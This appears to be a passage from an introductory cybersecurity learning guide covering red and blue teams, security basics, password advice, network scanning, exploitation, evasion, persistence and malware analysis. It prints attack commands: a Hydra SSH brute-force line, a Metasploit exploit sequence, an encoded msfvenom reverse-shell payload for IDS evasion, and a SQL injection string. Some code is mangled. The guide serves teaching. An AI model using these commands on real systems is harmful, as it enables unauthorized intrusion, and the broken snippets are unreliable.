An offensive security team, also known as a Red Team, is a group of cybersecurity professionals who focus on assessing an organization's security from an adversarial perspective. Its main objective is to simulate real cyber attacks to identify vulnerabilities and weaknesses in a company's systems, networks and applications. The offensive security team adopts an attacker's mindset and uses advanced techniques and tools to test the resilience of the organization's security infrastructure. Unlike the defensive security team, also known as the Blue Team, whose goal is to protect and defend an organization's systems against cyber threats, the offensive security team takes a proactive and aggressive stance. While the Blue Team focuses on incident detection and response, the Red Team seeks to identify vulnerabilities before they are exploited by real attackers. The Offensive Security Team conducts penetration testing, vulnerability assessments and risk analysis to help the organization strengthen its security posture and improve its ability to respond to potential attacks.
In other words, the offensive security team (Red Team) focuses on simulating cyber attacks to identify vulnerabilities, while the defensive security team (Blue Team) focuses on protecting and defending systems against threats. Both teams work together to ensure the comprehensive security of an organization.

## 7. Cybersecurity Fundamentals
We will now explore the fundamentals of cybersecurity. As a cybersecurity expert, it is important to have a solid understanding of the fundamental concepts. A few points are detailed below with examples. Practical exercises are also included. You can advance to more advanced levels once you are comfortable with these concepts and tools. Remember to keep your systems up to date and follow security best practices at all times to reduce vulnerabilities. And don't forget to keep up to date with the latest trends and threats in cybersecurity, as this field is constantly evolving.
### 7.1. Understanding Basic Cybersecurity Concepts
Online threats can take many forms, from malware to distributed denial of service (DDoS) attacks. For example, ransomware is a common type of malware that encrypts a victim's files and demands a ransom to decrypt them. Online threats can include viruses, worms, Trojans, ransomware, distributed denial of service (DDoS) attacks, phishing and more. One example is ransomware malware, such as WannaCry, which encrypts files on a system and demands a ransom to decrypt them. Understanding these threats will help you identify and prevent attacks. Research and understand cybersecurity basics, such as threats, vulnerabilities, assets, and more. For example, a common threat is phishing, which involves tricking people into revealing sensitive information.
### 7.2. Operating Systems and Networks
Delves into operating systems such as Windows and Linux. In cybersecurity, it is important to understand operating systems and networks, as they are the foundation of most attacks and defenses. Regarding networks, you must understand how networks work, protocols and related concepts. One example is to understand the OSI model, which divides networks into layers, from the physical to the application layer. This will help you identify vulnerabilities and apply security measures at each layer. Also, learn how to administer a virtual machine with Linux. Also, understanding how file systems work in Linux will help you identify and protect critical files on a server.
### 7.3. Information Security
Confidentiality, integrity and availability are the three pillars of information security. Study the importance of confidentiality, integrity and availability of data. For example, when working in an enterprise environment, you must ensure that sensitive data is encrypted (confidentiality), that it is not altered without authorization (integrity) and that be available when needed (availability). Learn how to encrypt your files to maintain confidentiality, for example using tools such as GnuPG (GPG) on Linux or BitLocker on Windows. And don't forget that password management is essential. You can use tools such as LastPass or 1Password to manage and generate strong passwords, and enable two-factor authentication (2FA) for example with the Aegis tool for an additional layer of security.
### 7.4. Basic Tools
At this level, you should be familiar with common cybersecurity tools, such as antivirus, firewall and intrusion detection systems (IDS). For example, install an antivirus on your Linux system such as ClamAV or Windows Defender (for Windows) and perform a full scan of your system. These tools help detect and remove malware and perform a scan. Also try some intrusion detection systems that can alert you to possible threats on your network, such as unauthorized access attempts. And don't forget to configure a Firewall, such as Windows Firewall or ufw on Linux, to control incoming and outgoing network traffic and prevent unwanted connections. Regarding Intrusion Detection System (IDS) an example would be to configure Snort or Suricata as an IDS to detect and alert about possible threats in the network.
### 7.5. Tips for creating secure passwords
Creating secure passwords is essential to protect personal information and prevent unauthorized access.
Here are five tips for creating secure passwords:
* Use a combination of letters, numbers and special characters: Mix uppercase and lowercase letters, numbers and special characters such as !@#$%^&* to increase the complexity of the password.
* Avoid using common or easy-to-guess passwords: Avoid using obvious passwords such as "123456" or "password". Also avoid personal information such as names, birth dates or phone numbers.
* Create long passwords: The longer the password, the harder it will be to guess. It is recommended to use at least 12 characters.
* Do not reuse passwords: Use unique passwords for each account or service. If an attacker discovers one password, he will not be able to access all your accounts if each one has a different password.
* Use a password manager: Consider using a reliable password manager to generate and store strong passwords. These tools can help you remember complex passwords without having to type them in or remember them manually.
Remember that the security of your passwords is essential to protect your personal information and prevent unauthorized access. By following these tips, you can strengthen the security of your accounts and reduce the risk of data compromise.
```
#!/bin/bash
< /dev/urandom tr -dc '_A-Za-z0-9\-!@#$%^&*()_=' | head -c${1:-32}; echo
```
Example of a BASH script to generate secure and random passwords. ### 7.6.
Practical Exercises

* Research data protection under the General Data Protection Regulation (GDPR) or similar privacy laws and how it affects organizations.
* Configure a Firewall on a virtual machine and set rules to allow or block network traffic.
* Research the principle of least privilege in operating systems and how it applies to security. Then, adjust the file and directory permissions on your system to follow this principle.
* Research examples of current online threats, such as the NotPetya ransomware attack or the "CEO fraud" phishing attack. Understand how they work and how you can prevent them.
* Set up a virtual machine with a GNU/Linux system (e.g. Debian) and learn how to administer it using the command line. Explore how to set up a web server or VPN.
* Try the GnuPG (GPG) tool to encrypt and decrypt emails or files. Understand how it is used to ensure the confidentiality of information.
## 8. Basic Penetration Tests
This chapter focuses on basic penetration testing and essential cybersecurity skills. Mastering these concepts will provide you with essential skills to conduct basic penetration testing in an ethical and legal manner, and understand security vulnerabilities, for this I suggest you seek out online communities and study groups to gain support and share knowledge with other cybersecurity enthusiasts. These skills will serve as a foundation for you to advance to more advanced levels of cybersecurity. You should also ask a person with advanced knowledge to be your mentor, so that they can guide you through the process. These skills will prepare you to advance to more advanced levels of cybersecurity. It never hurts to emphasize that you should always remember to practice cybersecurity in an ethical and legal manner.
### 8.1. Programming and Scripting
In cybersecurity, programming and scripting especially with Python are extremely essential skills for automation and customization of tools. An example would be writing a Python script to perform a port scan on a network. Here is a simple example in Python to perform a port scan and then a report on the open ports and corresponding services:
```
import socket
def scan_port(ip, port): try:
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.settimeout(1)
result = sock.connect_ex((ip, port)) if
result == 0:
return True
else:
return False
except Exception:
return False ip_target
= "192.168.1.1"
ports = [21, 22, 80, 443, 3389]
for port in ports:
if scan_port(ip_target, port): print(f "Port
{port} is open")
```
### 8.2. Network Scanning and Enumeration
Master the use of tools such as Nmap to scan networks and enumerate assets. To perform penetration testing, you need network scanning and enumeration skills. A frequently used tool is Nmap for network scanning and asset enumeration.
Examples:
```
nmap -F 192.168.1.0/24
```
This will scan the first 256 IP addresses on the 192.168.1.0 subnet and display the open ports on each host. You must modify this according to the IP addresses of your internal network.
```
nmap -p- -A -T4 192.168.1.1
```
This will scan all ports, perform a service detection and list details about the target system. You must modify it according to the IP addresses of your target on the internal network.
### 8.3. Exploitation
Exploitation involves exploiting vulnerabilities to gain unauthorized access to systems. For example, you can learn about brute-force attacks, which consist of trying passwords until you find the right one.By exploring vulnerabilities, you can learn how to identify and exploit them in an ethical manner. For example, after discovering a vulnerability in a web server that allows remote command execution, you can use the Metasploit Framework to launch an attack. Or use the Hydra tool to perform a brute force attack on an SSH server. Also study how common vulnerabilities work and how to exploit them ethically. In general try to learn about the brute force attack on passwords and how to prevent it.
```
hydra -l username -P wordlist.txt ssh://target_ip
```
This will attempt to log into the SSH server with the username and a list of passwords from the 'wordlist.txt' file.
```
msfconsole
use exploit/unix/webapp/vulnerable_app
set RHOST 192.168.1.1.1
exploit
```
This is merely illustrative of how to use Metasploit to exploit a known vulnerability in a web application on a remote server.
### 8.4. Acquire Certifications
Consider obtaining recognized certifications in cybersecurity, such as CompTIA Security+ or Certified Ethical Hacker (CEH). Also consider the eLearnSecurity Certified Professional Penetration Tester (eCPPT) or Certified Information Systems Security Professional (CISSP) certification for more advanced skills and industry recognition. Prepare for the exam by studying guides and online courses, and taking practice exams. These certifications will validate your skills and open up opportunities in the cybersecurity field. For example, to prepare for the CompTIA Security+ certification, you can use study books and online resources, and then take practice exams to test your knowledge. One example is to sign up for a free, good-quality online course or take a certification preparation course.
### 8.5. Practical Exercises
* Perform lab exercises to familiarize yourself with Nmap and its scanning options. In particular, scan a network, identify active hosts and discover services and software versions.
* Set up a test lab where you can explore different vulnerabilities, for example try to perform a SQL Injection on a web application and perform penetration tests in a controlled manner.
* Use tools such as Metasploit to perform ethical exploit testing on your systems or in lab environments.
* Research and practice with different methods of brute force attacks, such as attacks on web services or databases.
* Create a custom Python script that performs a port scan and logs the results to a file.

Evasion and persistence are critical aspects of Red Team operations. An example would be learning how to evade intrusion detection systems (IDS) and maintain persistent access on compromised systems. For evasion, you could investigate techniques such as shellcode injection into legitimate processes or the use of anti-forensic techniques. For persistence, you could learn about the use of Trojans and backdoors to maintain long-term access to a system. For example, research firewall and IDS evasion techniques. One example would be to use obfuscation techniques in a shellcode to avoid detection by an IDS. Another example might be to obfuscate a Metasploit shellcode to evade detection. In addition, persistence refers to maintaining long-term access on a compromised system. For example, you can learn how to use tools such as PowerShell Empire to establish persistence on a Windows system.
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port -f c -e
x86/shikata_ga_nai
```
### 9.2. Malware Analysis
#### Malicious Code Analysis
Malware analysis involves breaking down and understanding how malicious programs work. For example, you can study a suspicious file, such as an email attachment, to identify its behavior and determine if it is malicious. Studying malware analysis helps you understand how advanced threats work. In other words, malware analysis involves studying malicious programs to understand their behavior and purposes. An example would be static analysis, where the malware code is examined without executing it. An example would be to analyze a suspicious file in a controlled environment for this you can use tools such as IDA Pro or Ghidra to analyze the malware assembly code and look for indicators of malicious behavior.
#### Dynamic Analysis
Dynamic analysis involves running malware in a controlled environment to observe its behavior in real time. For example, you can use an isolated virtual machine to run malware and observe how it communicates with remote servers, what files it creates or modifies, and what actions it performs.
## 10. Advanced Penetration Testing
At this point, you can explore more advanced penetration testing techniques. For example, web application analysis involves looking for vulnerabilities in web applications and online services. An example of this might be looking for SQL injection vulnerabilities in an application. web, or IoT analysis. For example, it investigates in detail about the concept of "SQL Injection" and performs tests in a lab environment.
### 10.1. Web Application Analysis
Web application analysis involves looking for vulnerabilities in web applications and online services. As mentioned above, an example is the identification of a SQL Injection vulnerability in a web application.
```
SELECT FROM users WHERE name = '' OR '1'='1';
```
This is an example of SQL injection, a common vulnerability that allows an attacker to manipulate the database of a web application which could return sensitive information from the database due to the vulnerability.
### 10.2. IoT and Industrial Systems
You can explore security in Internet of Things (IoT) devices and industrial systems. This could involve analyzing the security of an industrial automation system or an IoT device such as a security camera. For example, you could investigate IoT-specific vulnerabilities in devices such as smart locks or connected thermostats.
